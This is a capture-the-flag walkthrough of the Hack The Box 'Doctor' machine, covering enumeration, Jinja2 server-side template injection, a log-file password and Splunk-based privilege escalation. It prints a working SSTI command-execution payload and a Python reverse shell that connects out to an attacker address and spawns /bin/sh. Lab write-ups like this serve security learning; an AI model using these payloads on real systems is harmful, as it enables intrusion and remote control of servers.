# User access

## Scan

As always I started by running nmap on the target IP in search of open ports

![](/doctor/img/nmap.PNG)

This is a Linux machine and ports 22, 80 and 8089 are open, this is more than enough. I proceeded by visiting the webserver on port 80 and running gobuster looking for some useful directories.

## Enumeration

There's nothing interesting enumerating the webserver's directories, I used a small wordlist, you can try something bigger but I didn't need this anyway.

![](/doctor/img/dirb.PNG)

## Webserver

This is the website homepage, there is nothing really interesting except for a domain named **doctors.htb**

![](/doctor/img/webserver.PNG)

## Virtual host

I added _doctors.htb_ into my **/etc/hosts** file and visited the URL again, now there's **actually** some interesting: a login page!

![](/doctor/img/login.PNG)

At this point I thought that I might have found something more useful enumerating the directories. So I ran gobuster once again.

![](/doctor/img/dirb-vhost.PNG)

Nothing out of the ordinary, apparently. I noticed an _archive_ folder and explored in the URL. Nothing happens but it's quite suspicious.

## Messing up with login/register page

I've tried some simple SQL injection but nothing worked, so I started looking around for other pages, I first checked the register page. Is a simple form, I didn't find anything interesting, XSS doesn't work and there are no exploitable file uploads either. At this point I tried to register a new user.

At this point you are redirected to the homepage, there is a section when you can submit a post with a title and a content. The post will be shown on the homepage.

![](/doctor/img/board.PNG) ![](/doctor/img/homepage.PNG)

I think there might be a vulnerability here somewhere, so I documented myself about how exploiting form submissions and I found an interesting document about **Server-side Template Injection** (SSTI). You can find a nicely documented methodology on [this repo](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection).

Now we might have a initial foothold on what to do on this machine.

## Exploiting the template

By looking the graph in the previous repo (under the "Methodology" section) there is a nice [flowchart](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Template%20Injection/Images/serverside.png) where we notice how we can exploit a template by injecting some values in order to find if they are processed and, at the end, discover which framework is running under the webserver.

The real question now is: **where should the expressions be evaluated?** Looking around I remembered the **archive** directory I found while enumerating. So I wrote a very simple payload based on the flowchart and checked out the archive directory. Bingo!

![](/doctor/img/example-payload.PNG)  

This was the result of the expression:

![](/doctor/img/example-payload2.PNG)

After a couple of attempts following the flowchart I found that the framework under the hood is Jinja2, which is written in Python. This is a very useful information as I'm now aware of the language I have to use if I want to write and run payloads.

What I had to do was to write a python payload in order to open a shell on my machine.

## Writing the payload

This is honestly the part where I struggled the most. Mostly because I didn't know the Jinja engine. The first part was to write a python script in order to run simple commands, so I tried things like {{import os; os.system("whoami");}} but nothing worked. Since I was stuck on this part I asked help to users on HTB chats and forums for a nudge. I found this piece of conversation to be somehow helpful.

![](/doctor/img/chat.PNG)

I was actually missing that the script were ran under a backend engine, so I needed to "crawl" into the engine context in order to require the objects and the methods that I needed to run my payload.

While digging on the internet I found an interesting article about [SSTI on Jinja2](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/). Here you can find a simple explanation about MRO (which is a way you can exploit in order to run your payload) and the global variables stored into jinja's context. In particular we have the **request** object, from which we can write something like this:

{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

<table style="border: 1px;"></table>

From this stub we can write the payload we need in order to open a shell on our machine. Some basic socket code did the trick for me. This was the code I used:

```python
import socket, os, pty  
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # create a basic socket with ipv4 addresses and TCP protocol  
s.connect(("x.x.x.x", 4444)) # connect to your local machine using port 4444  
os.dup2(s.fileno(), 0) # duplicate the socket descriptor on your standard input (0), standard output (1) and standard error (2), in order to display commands output on your terminal  
os.dup2(s.fileno(), 1)  
os.dup2(s.fileno(), 2)  
pty.spawn("/bin/sh") # spawn a shell on your terminal  
```

put this code (without the # comments) in the popen() function, calling the script using "python3 -c". This should be your final payload:

```
{{request.application.__globals__.__builtins__.__import__('os').popen('python -c '\ import socket, os, pty; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("x.x.x.x", 4444)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); pty.spawn("/bin/sh"); \'').read()}}
```

## Shell and privesc

Obviously no shell will spawn unless you put your machine on listening on an external port, so I ran netcat in listening mode on port 4444. Ran the URL on the /archive endpoint, a shell will spawn on your terminal!

![](/doctor/img/shell.PNG)

By enumerating on the machine we can find some useful information. There are 2 users, _web_ and _shaun_, and we are logged as the first one. As web, we can't do anything except looking for interesting files. I followed [this guide](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) for basic privesc commands and in the /var/log/apache2/ directory I found a file named "backup". By displaying its content on screen I finally found a password!

![](/doctor/img/user_password.PNG)

...Or at least it looks like one. The first thing I tried is to switch from web to shaun. So I used the _su_ command using the password I found, aaaaand we are in! Right now we can search for the user.txt flag, it's located in the /home/shaun directory, so we cat the content and we finally have user.

![](/doctor/img/user-txt.PNG)

# From user to root

I found this part easier than user, I didn't had much informations, but there was one service that I didn't even checked: **the splunk service on port 8089**. Since I didn't found nothing useful by navigating on the service via browser, I searched on the internet for a privesc tool and I found [this one](https://github.com/cnotin/SplunkWhisperer2) that exploits misconfigurations on the service. Before using this tool, I suggest to read [here](https://airman604.medium.com/splunk-universal-forwarder-hijacking-5899c3e0e6b2) in order to fully comprehend the vulnerability you are exploiting.

By the way, in order to use this tool, I cloned the repository, opened another terminal window and ran nc on port 9999 and used the PySplunkWhisperer_remote script following the usage instructions. The script did everything for me, and on the netcat window I had a shell as root!

![](/doctor/img/root_shell.PNG)  

![](/doctor/img/root_shell2.PNG)